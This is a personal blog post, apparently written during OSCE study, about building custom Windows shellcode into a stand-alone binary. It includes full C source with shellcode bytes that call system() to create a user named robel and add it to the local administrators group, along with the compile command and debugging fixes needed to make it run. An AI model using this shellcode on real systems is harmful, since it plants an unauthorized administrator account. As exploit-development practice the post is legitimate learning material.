---
title: "Compiling and Running Custom Shellcode"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - exploit development
---
![image](https://user-images.githubusercontent.com/29740744/114959112-61206b00-9e32-11eb-8285-37bce2973f5b.png)

While studying for the Offensive Security Certified Expert (OSCE), I took some time to practice writing custom shellcode and read up on how certain Windows API calls can be leveraged to execute your shellcode. I wanted to take it a step further and actually run my shellcode as a stand-alone binary apart from running it in an exploit for debugging purposes.

This post aims to provide a quick overview of my findings and perhaps help other aspiring exploit developers out there.

In this particular example, I used the system() function found in Windows msvcrt.dll. You can read more about that [here](http://www.gosecure.it/blog/art/452/sec/create-a-custom-shellcode-using-system-function/). The shellcode I chose to run creates a new user and adds them to the administrator's group. Below is the breakdown of the shellcode.

![image](https://user-images.githubusercontent.com/29740744/114959164-7c8b7600-9e32-11eb-8ba8-52ad43add435.png)

For the sake of brevity, I won't go into detail about how I came up with this shellcode. There are plenty of resources that cover custom shell coding. [This](https://www.fuzzysecurity.com/tutorials/expDev/6.html) post helped me quite a bit.

The next step was placing my shellcode in a C program. After a bit of searching, I found this format thanks to this [article](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html).

```c
#include <stdio.h>


unsigned char shellcode\[\] = "\\x31\\xc0"
"\\x50"
"\\x68\\x2f\\x61\\x64\\x64"
"\\x68\\x62\\x65\\x6c\\x20"
"\\x68\\x73\\x20\\x72\\x6f"	// This shellcode 
"\\x68\\x61\\x74\\x6f\\x72"  // runs the following 
"\\x68\\x69\\x73\\x74\\x72"  // command...
"\\x68\\x64\\x6d\\x69\\x6e"  // net user robel robel /add & 
"\\x68\\x75\\x70\\x20\\x61"  // net localgroup administrators robel /add
"\\x68\\x6c\\x67\\x72\\x6f"
"\\x68\\x6c\\x6f\\x63\\x61"
"\\x68\\x6e\\x65\\x74\\x20"
"\\x68\\x64\\x20\\x26\\x20"
"\\x68\\x20\\x2f\\x61\\x64"
"\\x68\\x6f\\x62\\x65\\x6c"
"\\x68\\x65\\x6c\\x20\\x72"
"\\x68\\x20\\x72\\x6f\\x62"
"\\x68\\x75\\x73\\x65\\x72"
"\\x68\\x6e\\x65\\x74\\x20"
"\\x89\\xE0"
"\\x6A\\x01"
"\\x50"
"\\xBB\\xc7\\x93\\xc2\\x77"  // Location of system() function call (update this)
"\\xFF\\xD3";




int main()
{
	((void(\*)())shellcode)();
	return 0;
}
```

Pretty straight forward up until this point right? All I needed to do now was compile this into a PE file and I'm good. Upon compiling this code in Visual Studio 2019, everything was successful up until running it on Windows 7...

![image](https://user-images.githubusercontent.com/29740744/114959200-93ca6380-9e32-11eb-9f9f-9e62b056bdf2.png)

Naturally, I ran the binary in a debugger to see what was going on. There were two things I discovered. First, there was an access violation once the program reached the beginning of my shellcode routine.

![image](https://user-images.githubusercontent.com/29740744/114959215-9c229e80-9e32-11eb-9319-689685595608.png)

This was easily fixed by modifying the .data section of the PE file to be executable. The next issue lies in the call to the system() function. Even if you have the correct address of where system() is located in memory, in this case, 0x7596B177 (NOTE: This address will change from boot to boot due to ASLR), the program crashes because the memory does not exist within the program. Why? Checking the imported modules reveals that msvcrt.dll is not loaded.

![image](https://user-images.githubusercontent.com/29740744/114959247-a8a6f700-9e32-11eb-8218-2d8592b3135a.png)

Remember, the system() function resides within msvcrt.dll. If it isn't loaded when the program is running, it cannot locate the pointer to system() in memory. I am not entirely sure why Visual Studio did not include the .DLL but my guess would have something to do with outdated and/or somewhat obsolete .DLLs.

So, going back to the code, I decided I needed to find a different compiler. After a bit of research, I decided to go with [MinGW](http://www.mingw.org/). From the command line, I ran the following...

```console
C:\\MinGW\\bin>mingw32-gcc.exe addUser.c -o adduser.exe
```

After opening the binary in a debugger, I can see that this time msvcrt.dll was imported.

![image](https://user-images.githubusercontent.com/29740744/114959269-b65c7c80-9e32-11eb-8275-71e95e2b9a91.png)

Setting a breakpoint on the address of system() in msvcrt.dll (again, this varies from boot to boot) I ran my program and examined the call stack when it hit the breakpoint. As expected, just before a function call was made to system(), Olly Dbg recognized the memory location of system() and the pointer address was successfully added to the EBX register.

(0040407D   MOV EBX, msvcrt.system)

![image](https://user-images.githubusercontent.com/29740744/114959285-be1c2100-9e32-11eb-8d34-6f6b7470f814.png)

Once I let the program continue to run, the user, robel, was created and added to the administrator's group as expected.

![image](https://user-images.githubusercontent.com/29740744/114959294-c4120200-9e32-11eb-867f-feba62bbaa33.png)

Notice that the program still crashes. I imagine it is due to a lack of an exit() function after my routine runs but I will save that for another time.

So what did I learn?

1.  Ensure your PE file's sections are executable. An access violation will let you know real quick.
2.  Take note of which compiler you are using when developing a standalone PE file. Not all of them work the same. Your binary might not run on different Windows OS versions.
3.  Validate the necessary imported modules for your shellcode to run in a debugger or PE examiner of your choice.

Please comment and provide feedback if you want to add anything or found this useful.
